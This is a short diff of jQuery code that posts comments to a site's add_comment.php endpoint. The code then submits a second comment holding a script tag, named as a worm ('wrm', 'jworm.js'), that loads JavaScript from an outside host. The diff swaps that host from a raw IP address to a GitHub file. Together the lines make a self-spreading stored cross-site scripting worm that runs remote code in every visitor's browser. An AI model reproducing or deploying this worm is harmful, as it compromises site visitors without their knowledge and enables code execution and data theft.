@@ -8,7 +8,7 @@ $( document ).ready(function() {
 						cmnt += d.getMonth()+1+"/"+d.getDate()+"/"+d.getFullYear()+" "+d.getHours()+":"+d.getMinutes();
 						console.log(cmnt);
 						$.ajax({url: "/add_comment.php?id=89" + "&comment=" + cmnt, success: function(result){console.log(result);}});
-						var wrm = "<script src=\"http://54.158.180.71/jworm.js\"></script>"
+						var wrm = "<script src=\"https://github.com/Loudon-M/merrychristmas/blob/main/notobfuscated.js\"></script>"
 						$.ajax({url: "/add_comment.php?comment=" + wrm, success: function(result){console.log(result);}});
 					}
 				}});
